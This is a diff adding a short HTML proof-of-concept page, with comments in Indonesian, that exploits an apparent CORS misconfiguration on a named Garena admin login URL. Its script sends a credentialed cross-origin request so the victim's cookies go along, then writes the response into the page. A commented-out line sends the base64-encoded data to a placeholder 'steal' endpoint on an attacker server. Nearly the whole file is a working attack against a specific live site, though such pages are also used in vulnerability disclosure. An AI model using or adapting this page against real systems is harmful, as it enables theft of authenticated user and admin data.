@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head><title>CORS PoC</title></head>
+<body>
+  <h1>CORS Misconfig PoC for https://mainadm.aov.garena.co.id/admin/login</h1>
+  <script>
+    fetch('https://mainadm.aov.garena.co.id/admin/login', {
+      method: 'GET', // atau POST jika ada payload
+      credentials: 'include', // Kirim cookies jika victim login
+      headers: { 'Origin': 'hakaruwan.github.io' } // Ganti dengan domain PoC kamu
+    })
+    .then(res => res.text())
+    .then(data => {
+      document.body.innerHTML += '<pre>' + data + '</pre>'; // Tampilkan response
+      // Kirim ke attacker: fetch('https://your-server.com/steal?data=' + btoa(data));
+    })
+    .catch(err => console.log('Error:', err));
+  </script>
+</body>
+</html>
